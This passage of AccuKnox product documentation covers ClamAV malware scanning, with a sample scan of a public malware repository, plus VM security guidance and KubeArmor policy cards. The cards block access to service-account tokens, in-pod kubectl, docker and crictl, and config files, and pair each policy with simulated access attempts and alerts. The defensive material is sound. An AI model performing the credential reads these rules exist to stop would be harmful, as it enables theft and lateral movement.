SaaS integration can protect from these malicious files by taking the archives as input and then extracting and scanning them against trusted ClamAV database out of the box. It can scan against the archive formats below:</p> <ul> <li> <p>RAR (most versions)</p> </li> <li> <p>7Zip</p> </li> <li> <p>Zip (exclude some extensions)</p> </li> <li> <p>Tar</p> </li> <li> <p>XZ</p> </li> <li> <p>Gzip</p> </li> <li> <p>Bzip2</p> </li> <li> <p>XAR</p> </li> <li> <p>ARJ</p> </li> <li> <p>IMG</p> </li> <li> <p>ISO 9660</p> </li> <li> <p>PKG</p> </li> <li> <p>Microsoft OLE2</p> </li> <li> <p>Microsoft OOXML (Office documents)</p> </li> <li> <p>Microsoft Cabinet Files (including SFX)</p> </li> <li> <p>Microsoft CHM (Compiled HTML)</p> </li> <li> <p>Microsoft SZDD compression format and others</p> </li> </ul>"},{"location":"use-cases/vm-malware-scan/#scan-windows-portable-executablespe","title":"Scan Windows Portable Executables(PE)","text":"<p>Portable Executables(PE) is a data structure that contains the information required for the Windows OS loader to handle the executables. The ClamAV integration can scan Windows executable files for both 32/64 bit and protect them from attacks like process injection and back-door implementation. The below compression formats are supported for scanning:</p> <ul> <li> <p>PeSpin</p> </li> <li> <p>UPX</p> </li> <li> <p>AsPack</p> </li> <li> <p>MEW</p> </li> <li> <p>FSG</p> </li> <li> <p>NsPack</p> </li> <li> <p>Petite</p> </li> <li> <p>Y0da Cryptor</p> </li> <li> <p>Upack</p> </li> <li> <p>wwpack32</p> </li> </ul>"},{"location":"use-cases/vm-malware-scan/#scan-mail-attachments","title":"Scan mail Attachments","text":"<p>Mail attachments can contain malicious files that can trigger suspicious activities. From the AccuKnox SaaS, we can scan these mail attachments before opening or even downloading them and protect users from viruses, malware, or other potentially dangerous code. Almost all mail file formats can be scanned from the SaaS UI.</p>"},{"location":"use-cases/vm-malware-scan/#detect-pii-in-text-files","title":"Detect PII in text files","text":"<p>PII stands for personally identifiable information. The ClamAV integration will allow users to check for sensitive information in their emails e.g. bank details, credit card information, etc from the AccuKnox SaaS itself. It will utilize the <code>libclamav</code> package to detect and flag credit card information in the SaaS. The below credit card issuers are supported:</p> <ul> <li> <p>VISA</p> </li> <li> <p>MasterCard</p> </li> <li> <p>AMEX</p> </li> <li> <p>Discover</p> </li> <li> <p>Diner's Club</p> </li> <li> <p>JCB</p> </li> <li> <p>U.S. social security numbers inside text files</p> </li> </ul>"},{"location":"use-cases/vm-malware-scan/#scanning-windows-files-using-clamav","title":"Scanning Windows files using ClamAV","text":"<p><code>clamscan -r -i /[path-to-folder]</code></p> <ul> <li> <p>Sample file to be scanned: Github_link</p> </li> <li> <p>Clone the repo and provide the file path in clamscan</p> </li> </ul> <pre><code>C:\\Users\\vboxuser\\Desktop\\Clamav&gt;clamscan -r \\Users\\vboxuser\\Desktop\\The-MALWARE-Repo --log=\\Users\\vboxuser\\Desktop\\report.log --bell --infected\n</code></pre> <p>-r = recursive</p> <p>Scan Summary</p> <pre><code>----------- SCAN SUMMARY -----------\nKnown viruses: 8703310\nEngine version: 1.4.1\nScanned directories: 59\nScanned files: 67\nInfected files: 8\nTotal errors: 19\nData scanned: 64.01 MB\nData read: 213.92 MB (ratio 0.30:1)\nTime: 112.484 sec (1 m 52 s)\nStart Date: 2024:12:27 15:56:19\nEnd Date:   2024:12:27 15:58:11\n</code></pre>"},{"location":"use-cases/vm-malware-scan/#findings","title":"Findings","text":"<pre><code>C:\\Users\\vboxuser\\Desktop&gt;findstr \"FOUND\" report.log\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Joke\\CrazyNCS.exe: Win.Trojan.Joke-15 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Joke\\Curfun.exe: Win.Trojan.Cursorfun-1 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Joke\\Popup.exe: Win.Trojan.Ag-6 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Joke\\Time.exe: Win.Trojan.Joke-25 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Joke\\Trololo.exe: Win.Trojan.MSIL-31 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Net-Worm\\CodeRed.a.exe: Win.Worm.CodeRed-2 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Trojan\\MrsMajors\\MrsMajor2.0.7z: Win.Trojan.Generic-6584387-0 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Virus\\Melissa.doc: Doc.Dropper.Agent-6369059-0 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Joke\\CrazyNCS.exe: Win.Trojan.Joke-15 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Joke\\Curfun.exe: Win.Trojan.Cursorfun-1 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Joke\\Popup.exe: Win.Trojan.Ag-6 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Joke\\Time.exe: Win.Trojan.Joke-25 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Joke\\Trololo.exe: Win.Trojan.MSIL-31 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Net-Worm\\CodeRed.a.exe: Win.Worm.CodeRed-2 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Trojan\\MrsMajors\\MrsMajor2.0.7z: Win.Trojan.Generic-6584387-0 FOUND\nC:\\Users\\vboxuser\\Desktop\\The-MALWARE-Repo\\Virus\\Melissa.doc: Doc.Dropper.Agent-6369059-0 FOUND\n</code></pre>"},{"location":"use-cases/vm-malware-scan/#key-takeaways","title":"Key Takeaways","text":"<ul> <li> <p>Users can scan Windows/Linux filesystems using ClamAV.</p> </li> <li> <p>Users can automate the scan and reporting.</p> </li> <li> <p>After the scan, the data can be seen on AccuKnox SaaS.</p> </li> <li> <p>Users can create tickets to quarantine or remove the infected files from AccuKnox SaaS</p> </li> </ul>"},{"location":"use-cases/vm-misconfigurations/","title":"Overview of VM Misconfigurations and Fixes in AccuKnox","text":""},{"location":"use-cases/vm-misconfigurations/#misconfiguration-of-cloud-hosted-virtual-machines","title":"Misconfiguration of Cloud-Hosted Virtual Machines","text":"<p>Cloud-hosted virtual machines (VMs) are an essential part of modern infrastructure. However, misconfigurations can lead to significant security vulnerabilities. This document provides a detailed guide to understanding and preventing misconfigurations in virtual machines hosted on AWS, GCP, and Azure.</p> <p>AWS Misconfiguration</p> <p>GCP Misconfiguration</p> <p>Azure Misconfiguration</p>"},{"location":"use-cases/vm-misconfigurations/#general-best-practices-for-vm-security","title":"General Best Practices for VM Security","text":""},{"location":"use-cases/vm-misconfigurations/#1-access-control","title":"1. Access Control","text":"<ul> <li> <p>Principle of Least Privilege (PoLP): Ensure users and services have only the permissions they need.</p> </li> <li> <p>Multi-Factor Authentication (MFA): Require MFA for all accounts accessing the cloud environment.</p> </li> <li> <p>Identity Federation: Integrate with centralized IAM solutions for streamlined and secure access.</p> </li> </ul>"},{"location":"use-cases/vm-misconfigurations/#2-network-security","title":"2. Network Security","text":"<ul> <li> <p>Restrict Traffic: Limit ingress and egress traffic using firewalls or security groups.</p> </li> <li> <p>Use Bastion Hosts: Restrict direct SSH/RDP access to VMs; use Bastion hosts for controlled access.</p> </li> <li> <p>Disable Unused Ports: Regularly review and close unnecessary ports to minimize attack surfaces.</p> </li> </ul>"},{"location":"use-cases/vm-misconfigurations/#3-patch-management","title":"3. Patch Management","text":"<ul> <li> <p>Regularly update the operating system and install software to address known vulnerabilities.</p> </li> <li> <p>Use automated patch management tools to streamline updates.</p> </li> </ul>"},{"location":"use-cases/vm-misconfigurations/#4-encryption","title":"4. Encryption","text":"<ul> <li> <p>Use encryption for data at rest and in transit.</p> </li> <li> <p>Ensure VM disks, backup files, and snapshots are encrypted.</p> </li> </ul>"},{"location":"use-cases/vm-misconfigurations/#5-monitoring-and-logging","title":"5. Monitoring and Logging","text":"<ul> <li> <p>Enable detailed logging for VM activities.</p> </li> <li> <p>Use centralized logging services to analyze logs and detect anomalies.</p> </li> <li> <p>Set up alerts for unauthorized access or changes to configurations.</p> </li> </ul>"},{"location":"use-cases/vm-overview/","title":"Introduction to AccuKnox VM Security","text":""},{"location":"use-cases/vm-overview/#introduction-to-accuknox-vm-security","title":"Introduction to AccuKnox VM Security","text":"<p>VM Security refers to the practices and technologies used to protect virtual machines (VMs) from threats, vulnerabilities, and unauthorized access. Virtual machines are software-based emulations of physical computers that run an operating system and applications. Since VMs share physical resources and are often part of dynamic, cloud-based environments, securing them is critical to maintaining the integrity of systems and data.</p> <p>Agentless Risk Assessment</p> <p>Agent Based Detection &amp; Remediation</p> <p>Advanced Threat Protection</p> <p>Reporting</p>"},{"location":"use-cases/vm-overview/#key-objectives-of-vm-security","title":"Key Objectives of VM Security","text":"<ol> <li> <p>Prevent Unauthorized Access:     Ensure that only authorized users and processes can access or manage VMs.</p> </li> <li> <p>Protect Data and Applications:     Safeguard data stored or processed within the VM from breaches or corruption.</p> </li> <li> <p>Maintain Compliance:     Adhere to industry regulations and security standards, such as GDPR, HIPAA, or PCI DSS.</p> </li> <li> <p>Ensure Isolation:     Prevent vulnerabilities in one VM or its host environment from affecting others.</p> </li> </ol>"},{"location":"use-cases/vm-overview/#key-components-of-vm-security","title":"Key Components of VM Security","text":"<ol> <li> <p>Secure Configuration:</p> <ul> <li> <p>Configure VMs with minimal privileges and follow security best practices.</p> </li> <li> <p>Disable unnecessary services and use hardened operating systems.</p> </li> </ul> </li> <li> <p>Patch Management:</p> <ul> <li>Keep the operating system, applications, and components up-to-date with the latest security patches.</li> </ul> </li> <li> <p>Access Control:</p> <ul> <li>Enforce strong authentication and role-based access controls (RBAC) for VM management.</li> </ul> </li> <li> <p>Network Security:</p> <ul> <li>Use virtual firewalls, segmentation, and encryption to protect communication between VMs.</li> </ul> </li> <li> <p>Monitoring and Logging:</p> <ul> <li> <p>Monitor VM activities in real-time to detect anomalies or malicious actions.</p> </li> <li> <p>Enable logging for audit trails and forensic investigations.</p> </li> </ul> </li> <li> <p>Malware Protection:</p> <ul> <li>Regularly scan VMs for malicious software and implement endpoint protection tools.</li> </ul> </li> <li> <p>Backup and Recovery:</p> <ul> <li>Maintain regular backups of VM data and configurations to recover quickly in case of an attack or failure.</li> </ul> </li> </ol> <p>By implementing comprehensive VM security measures, organizations can effectively secure their virtualized infrastructure and reduce the risk of cyber threats.</p>"},{"location":"use-cases/vm-overview/#accuknox-vm-security","title":"AccuKnox VM Security","text":"<p>AccuKnox enhances VM security by combining CSPM, Host Scanning, Malware Scanning, CWPP, Host Hardening, and Compliance Benchmarking (STIGs and CIS). These technologies offer comprehensive protection for virtual machines and hosts, ensuring both security and compliance.</p>"},{"location":"use-cases/vm-overview/#key-benefits-of-accuknox-vm-security","title":"Key Benefits of AccuKnox VM Security","text":"<ol> <li> <p>CSPM:     Automatically identifies and fixes cloud misconfigurations, ensuring secure VM deployments and compliance with security standards.</p> </li> <li> <p>Host Scanning:     Scans for vulnerabilities and outdated software on VM hosts, securing the underlying infrastructure.</p> </li> <li> <p>Malware Scanning:     Detects and blocks malware, preventing infections on VMs.</p> </li> <li> <p>CWPP:     Provides continuous protection for cloud workloads, detecting and mitigating security threats in real-time.</p> </li> <li> <p>Host Hardening:     Applies industry-standard security measures to secure the VM host, reducing attack surfaces.</p> </li> <li> <p>Compliance Benchmarking (STIGs &amp; CIS):     Ensures VMs and hosts comply with security standards like STIGs and CIS, aligning with regulatory and security best practices.</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-overview/#overall-benefits","title":"Overall Benefits","text":"<ul> <li> <p>Proactive Security: Prevents threats with continuous monitoring and remediation.</p> </li> <li> <p>Compliance Assurance: Meets regulatory standards through STIGs and CIS compliance.</p> </li> <li> <p>Real-Time Protection: Secures VMs and hosts with layered defenses.</p> </li> <li> <p>Reduced Attack Surface: Minimizes risks with host hardening and compliance checks.</p> </li> </ul> <p>AccuKnox ensures comprehensive VM security while helping organizations stay compliant with industry standards.</p>"},{"location":"use-cases/vm-reporting/","title":"Reporting","text":""},{"location":"use-cases/vm-reporting/#overview","title":"Overview","text":"<p>CWPP supports generating comprehensive security reports for your VM's, either on demand or as per a scheduled frequency. The reports help in analyzing security postures, tracking violations, and ensuring compliance.</p>"},{"location":"use-cases/vm-reporting/#on-demand-reports","title":"On-Demand Reports","text":"<ol> <li>Generate reports immediately after configuration, allowing for quick analysis of current cluster activity.</li> </ol> <p>Steps:-</p> <ol> <li> <p>Navigate to the Reports section in AccuKnox SaaS.</p> </li> <li> <p>Choose \"On Demand\" from the report type drop-down menu.</p> </li> <li> <p>Fill in the configuration details, including:</p> <ul> <li> <p>Name and Description for the report.</p> </li> <li> <p>VM Selection using regex syntax.</p> </li> </ul> </li> <li> <p>Click \"Save and Generate Report.\"</p> </li> <li> <p>The report will be generated in PDF format for the selected clusters and namespaces.</p> </li> </ol> <p>Scenario</p> <p>You need a detailed security posture analysis of vm <code>Testvm</code>. Use the regex <code>Testvm</code> and generate an on-demand report to assess violations and configurations.</p>"},{"location":"use-cases/vm-reporting/#scheduled-reports","title":"Scheduled Reports","text":"<ol> <li>Automatically generate reports at predefined intervals (e.g., daily, weekly, or monthly).</li> </ol> <p>Steps:-</p> <ol> <li> <p>Navigate to the Reports section in AccuKnox SaaS.</p> </li> <li> <p>Choose \"Scheduled\" from the report type drop-down menu.</p> </li> <li> <p>Fill in the configuration details, including:</p> <ul> <li> <p>Name and Email for the recipient.</p> </li> <li> <p>VM Selection using regex syntax.</p> </li> <li> <p>Frequency of the report (daily, weekly, or monthly).</p> </li> </ul> </li> </ol> <p></p> <ol> <li> <p>Click \"Save\" to Schedule Report.</p> </li> <li> <p>The report will be automatically sent to the configured email address daily at 01:00 AM UTC.</p> </li> </ol> <p>Scenario</p> <p>A compliance officer requires a weekly report summarizing activity across all clusters and namespaces. Use the regex <code>*/*</code> and configure a scheduled report to be delivered every Monday.</p>"},{"location":"use-cases/vulnerability/","title":"Vulnerability Management","text":"<p>AccuKnox SaaS provides a centralized platform for managing findings across various stages, from code development to runtime operations. By navigating to Issues \u2192 Findings, users can efficiently leverage advanced threat management features such as grouping, sorting, and filtering findings based on multiple criteria, ensuring streamlined analysis and prioritization.</p>"},{"location":"use-cases/vulnerability/#use-case-prioritizing-critical-findings-observed-today","title":"Use Case: Prioritizing Critical Findings Observed Today","text":"<p>To demonstrate the functionality, let's consider a scenario where a user wants to work on the most critical findings detected today.</p>"},{"location":"use-cases/vulnerability/#step-1-filter-findings-by-date","title":"Step 1: Filter Findings by Date","text":"<ol> <li> <p>Navigate to the Issues \u2192 Findings page and select the type of findings you want to see..    </p> </li> <li> <p>Use the Advanced Filter option to set the Last Seen filter to today's date:</p> </li> <li> <p>Click on the Fields to filter add Last Seen filter.</p> </li> <li> <p>Click on Last Seen Filter, Select today's date twice to narrow the results to the most recent findings.</p> </li> </ol> <p>The displayed list now contains vulnerabilities and misconfigurations identified today and still active.</p>"},{"location":"use-cases/vulnerability/#step-2-focus-on-critical-findings","title":"Step 2: Focus on Critical Findings","text":"<ol> <li> <p>Set the Risk Factor filter to Medium, High, Critical:</p> </li> <li> <p>This will show only the findings that require immediate attention.      </p> </li> </ol>"},{"location":"use-cases/vulnerability/#step-3-group-findings-by-asset","title":"Step 3: Group Findings by Asset","text":"<ol> <li> <p>Select Asset or Findings from the Group By dropdown menu:</p> </li> <li> <p>Grouping by Asset maps critical findings to specific assets, enabling targeted remediation.</p> </li> <li> <p>Grouping by Findings highlights similar findings affecting different assets, helping identify patterns and common issues.</p> </li> </ol> <p></p>"},{"location":"use-cases/vulnerability/#step-4-sort-findings","title":"Step 4: Sort Findings","text":"<ol> <li> <p>Click the first column header twice to sort by descending order:</p> </li> <li> <p>The asset with the highest number of critical findings will appear at the top of the list.</p> </li> </ol> <p>With this process, you can identify the highest-risk asset with active issues detected today that need immediate action.</p>"},{"location":"use-cases/vulnerability/#step-5-view-details-and-create-tickets","title":"Step 5: View Details and Create Tickets","text":"<ol> <li> <p>Click on the any finding to open a detailed view of a finding.</p> </li> <li> <p>From this view, you can:</p> </li> <li> <p>Create a single ticket that includes:</p> <ul> <li> <p>Details of the finding.</p> </li> <li> <p>Grouped assets affected.</p> </li> <li> <p>Available solutions.</p> </li> </ul> </li> <li> <p>Select a Ticket Configuration and click on the Create a Ticket icon.</p> </li> </ol> <p></p>"},{"location":"use-cases/vulnerability/#rule-engine","title":"Rule Engine","text":"<p>The Rule Engine enables automation for improved efficiency:</p> <ul> <li> <p>Create rules for specific type of finding to:</p> </li> <li> <p>Change the status of findings.</p> </li> <li> <p>Create tickets.</p> </li> <li> <p>Send notifications via email, Slack, or SIEM tools.</p> </li> </ul> <p></p> <p>For further details on configuring the Rule Engine, refer to this page.</p> <p>By leveraging these tools, AccuKnox SaaS ensures efficient and effective vulnerability management across your organization.</p> <p>SCHEDULE DEMO</p>"},{"location":"use-cases/zero-trust/","title":"Understanding Zero Trust with AccuKnox for Secure Access","text":"<p>Process based network control</p><p>Allow only specific processes to access network primitives, deny/audit everything else.</p> <p>Process based asset access</p><p>Allow only specific processes to access sensitive assets, deny/audit everything else.</p> <p>Process Whitelisting</p><p>Allow only specific processes to execute, deny/audit everything else.</p> <p>Network Segmentation</p><p>Limit network access strictly between whitelisted service endpoints, deny everything else.</p> <p>Ensure TLS</p><p>Ensure that all service endpoints are using the right TLS and certificate configuration.</p>"},{"location":"use-cases/cards/Account-token/","title":"Account token","text":"<p>Protect access to service account token</p>"},{"location":"use-cases/cards/Account-token/#description","title":"Description","text":"<p>K8s mounts the service account token as part of every pod by default. The service account token is a credential that can be used as a bearer token to access k8s APIs and gain access to other k8s entities. Many times there are no processes in the pod that use the service account tokens which means in such cases the k8s service account token is an unused asset that can be leveraged by the attacker.</p>"},{"location":"use-cases/cards/Account-token/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker would check for credential accesses so as to do lateral movements. For example, in most K8s attacks, the attacker after gaining entry into the K8s pods tries to use a service account token and gain access to other entities.</p>"},{"location":"use-cases/cards/Account-token/#tags","title":"Tags","text":"<ul> <li>CIS_v1.27</li> <li>Control-Id-5.1.6</li> </ul>"},{"location":"use-cases/cards/Account-token/#policy-templates","title":"Policy Templates","text":""},{"location":"use-cases/cards/Account-token/#service-account-token","title":"Service account token","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-wordpress-block-service-account\n  namespace: wordpress-mysql\nspec:\n  severity: 2\n  selector:\n    matchLabels:\n      app: wordpress\n  file:\n    matchDirectories:\n      - dir: /run/secrets/kubernetes.io/serviceaccount/\n        recursive: true\n  action: Block\n</code></pre>"},{"location":"use-cases/cards/Account-token/#simulation","title":"Simulation","text":"<pre><code>root@wordpress-7c966b5d85-42jwx:/# cd /run/secrets/kubernetes.io/serviceaccount/ \nroot@wordpress-7c966b5d85-42jwx:/run/secrets/kubernetes.io/serviceaccount# ls \nls: cannot open directory .: Permission denied \nroot@wordpress-7c966b5d85-42jwx:/run/secrets/kubernetes.io/serviceaccount# \n</code></pre>"},{"location":"use-cases/cards/Account-token/#expected-alert","title":"Expected Alert","text":"<pre><code>ClusterName: default\nHostName: aditya\nNamespaceName: wordpress-mysql\nPodName: wordpress-7c966b5d85-shn85\nLabels: app=wordpress\nContainerName: wordpress\nContainerID: 872599a29401aae31d39251a24b3c0012724a4878df8c8e1d72fa592f5b4a494\nContainerImage: docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\nType: MatchedPolicy\nPolicyName: DefaultPosture\nSource: /bin/ls serviceaccount/\nResource: /run/secrets/kubernetes.io/serviceaccount\nOperation: File\nAction: Block\nData: syscall=SYS_OPENAT fd=-100 flags=O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC\nEnforcer: AppArmor\nResult: Permission denied\nHostPID: 35455\nHostPPID: 34306\nOwner: map[Name:wordpress Namespace:wordpress-mysql Ref:Deployment]\nPID: 206\nPPID: 193\nParentProcessName: /bin/bash\nProcessName: /bin/ls\n</code></pre>"},{"location":"use-cases/cards/Account-token/#references","title":"References","text":"<p>MITRE Steal Application Access Token</p>"},{"location":"use-cases/cards/Account-token/#screenshots","title":"Screenshots","text":""},{"location":"use-cases/cards/Account-token/#hardening-policy","title":"Hardening policy","text":""},{"location":"use-cases/cards/Account-token/#policy-violation","title":"Policy violation","text":""},{"location":"use-cases/cards/Admin-tools/","title":"Admin tools","text":"<p>Do not allow execution of administrative/maintenance tools inside the pods.</p>"},{"location":"use-cases/cards/Admin-tools/#narrative","title":"Narrative","text":"<p>Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.</p>"},{"location":"use-cases/cards/Admin-tools/#attack-scenario","title":"Attack Scenario","text":"<p>It's important to note that attackers with permissions could potentially run 'kubectl exec' to execute malicious code and compromise resources within a cluster. It's crucial to monitor the activity within the cluster and take proactive measures to prevent these attacks from occurring. Attack Type Command Injection, Lateral Movements, etc. Actual Attack Target cyberattack, Supply Chain Attacks</p>"},{"location":"use-cases/cards/Admin-tools/#compliance","title":"Compliance","text":"<ul> <li>NIST_800-53_AU-2</li> <li>MITRE_T1609_container_administration_command</li> <li>NIST_800-53_SI-4</li> </ul>"},{"location":"use-cases/cards/Admin-tools/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Admin-tools/#admin-tools_1","title":"Admin tools","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: harden-dvwa-web-k8s-client-tool-exec\n  namespace: default\nspec:\n  action: Block\n  message: Alert! k8s client tool executed inside container.\n  process:\n    matchPaths:\n    - path: /usr/local/bin/kubectl\n    - path: /usr/bin/kubectl\n    - path: /usr/local/bin/docker\n    - path: /usr/bin/docker\n    - path: /usr/local/bin/crictl\n    - path: /usr/bin/crictl\n  selector:\n    matchLabels:\n      app: dvwa-web\n      tier: frontend\n  severity: 5\n  tags:\n  - MITRE_T1609_container_administration_command\n  - MITRE_TA0002_execution\n  - MITRE_T1610_deploy_container\n  - MITRE\n  - NIST_800-53\n  - NIST_800-53_AU-2\n  - NIST_800-53_SI-4\n  - NIST\n</code></pre>"},{"location":"use-cases/cards/Admin-tools/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it dvwa-web-566855bc5b-4j4vl -- bash\nroot@dvwa-web-566855bc5b-4j4vl:/var/www/html# kubectl\nbash: /usr/bin/kubectl: Permission denied\nroot@dvwa-web-566855bc5b-4j4vl:/var/www/html#\n</code></pre>"},{"location":"use-cases/cards/Admin-tools/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"ATags\": null,\n  \"Action\": \"Block\",\n  \"ClusterName\": \"aditya\",\n  \"ContainerID\": \"32015ebeea9e1f4d4e7dbf6608c010ef2b34c48f1af11a5c6f0ea2fd27c6ba6c\",\n  \"ContainerImage\": \"docker.io/cytopia/dvwa:php-8.1@sha256:f7a9d03b1dfcec55757cc39ca2470bdec1618b11c4a51052bb4f5f5e7d78ca39\",\n  \"ContainerName\": \"dvwa\",\n  \"Data\": \"syscall=SYS_EXECVE\",\n  \"Enforcer\": \"AppArmor\",\n  \"HashID\": \"1167b21433f2a4e78a4c6875bb34232e6a2b3c8535e885bb4f9e336fd2801d92\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 38035,\n  \"HostPPID\": 37878,\n  \"Labels\": \"tier=frontend,app=dvwa-web\",\n  \"Message\": \"\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Process\",\n  \"Owner\": {\n    \"Name\": \"dvwa-web\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 554,\n  \"PPID\": 548,\n  \"PodName\": \"dvwa-web-566855bc5b-4j4vl\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/bin/kubectl\",\n  \"Resource\": \"/usr/bin/kubectl\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"\",\n  \"Source\": \"/bin/bash\",\n  \"Tags\": \"\",\n  \"Timestamp\": 1696326880,\n  \"Type\": \"MatchedPolicy\",\n  \"UID\": 0,\n  \"UpdatedTime\": \"2023-10-03T09:54:40.056501Z\",\n  \"cluster_id\": \"3896\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Admin-tools/#references","title":"References","text":"<p>MITRE ATT&amp;CK execution in k8sTarget Data Breach</p>"},{"location":"use-cases/cards/Config-data/","title":"Securing Configuration Data with AccuKnox CNAPP","text":"<p>Protect access to configuration data containing plain text credentials.</p>"},{"location":"use-cases/cards/Config-data/#narrative","title":"Narrative","text":"<p>Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.</p>"},{"location":"use-cases/cards/Config-data/#attack-scenario","title":"Attack Scenario","text":"<p>In a possible attack scenario, an attacker may try to change the configurations to open websites to application security holes such as session hijacking and cross-site scripting attacks, which can lead to the disclosure of private data. Additionally, attackers can also leverage these changes to gather sensitive information. It's crucial to take proactive measures to prevent these attacks from occurring. Attack Type Cross-Site Scripting(XSS), Data manipulation, Session hijacking Actual Attack XSS attack on Fortnite 2019, Turla LightNeuron Attack</p>"},{"location":"use-cases/cards/Config-data/#compliance","title":"Compliance","text":"<ul> <li>CIS Distribution Independent Linuxv2.0</li> <li>Control-Id: 6.16.14</li> </ul>"},{"location":"use-cases/cards/Config-data/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Config-data/#config-data","title":"Config data","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-block-stig-v-81883-restrict-access-to-config-files\n  namespace: wordpress-mysql\nspec:\n  tags:\n  - config-files\n  message: Alert! configuration files have been accessed\n  selector:\n    matchLabels:\n      app: wordpress\n  file:\n    matchPatterns:\n    - pattern: /**/*.conf\n      ownerOnly: true\n  action: Block\n</code></pre>"},{"location":"use-cases/cards/Config-data/#simulation","title":"Simulation","text":"<p>With a shell different than the user owning the file: <pre><code>$ cat /etc/ca-certificates.conf\ncat: /etc/ca-certificates.conf: Permission denied\n$\n</code></pre></p>"},{"location":"use-cases/cards/Config-data/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"d3mo\",\n  \"ContainerID\": \"548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f\",\n  \"ContainerImage\": \"docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\",\n  \"ContainerName\": \"wordpress\",\n  \"Data\": \"syscall=SYS_OPEN flags=O_RDONLY\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"master-node\",\n  \"HostPID\": 39039,\n  \"HostPPID\": 38787,\n  \"Labels\": \"app=wordpress\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"wordpress\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 220,\n  \"PPID\": 219,\n  \"ParentProcessName\": \"/bin/dash\",\n  \"PodName\": \"wordpress-fb448db97-wj7n7\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/bin/cat\",\n  \"Resource\": \"/etc/ca-certificates.conf\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/bin/cat /etc/ca-certificates.conf\",\n  \"Timestamp\": 1696485467,\n  \"Type\": \"MatchedPolicy\",\n  \"UID\": 1000,\n  \"UpdatedTime\": \"2023-10-05T05:57:47.935622Z\",\n  \"cluster_id\": \"2302\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Config-data/#references","title":"References","text":"<p>MITRE Unsecured credentials in filesTurla LightNeuron</p>"},{"location":"use-cases/cards/Database-access/","title":"Database access","text":"<p>Protect read/write access to raw database tables from unknown processes.</p>"},{"location":"use-cases/cards/Database-access/#narrative","title":"Narrative","text":"<p>Applications use databases to store all the information such as posts, blogs, user information, etc. WordPress applications almost certainly use a MySQL database for storing their content, and those are usually stored elsewhere on the system, often /var/lib/mysql/some_db_name. </p>"},{"location":"use-cases/cards/Database-access/#attack-scenario","title":"Attack Scenario","text":"<p>Adversaries have been known to use various techniques to steal information from databases. This information can include user credentials, posts, blogs, and more. By obtaining this information, adversaries can gain access to user accounts and potentially perform a full-account takeover, which can lead to further compromise of the target system. It's important to ensure that appropriate security measures are in place to protect against these types of attacks. Attack Type SQL Injection, Credential Access, Account Takeover Actual Attack Yahoo Voices Data Breach in 2012</p>"},{"location":"use-cases/cards/Database-access/#compliance","title":"Compliance","text":"<ul> <li>CIS Distribution Independent Linuxv2.0</li> <li>Control-Id: 6.14.4</li> </ul>"},{"location":"use-cases/cards/Database-access/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Database-access/#database-access_1","title":"Database Access","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-block-mysql-dir\n  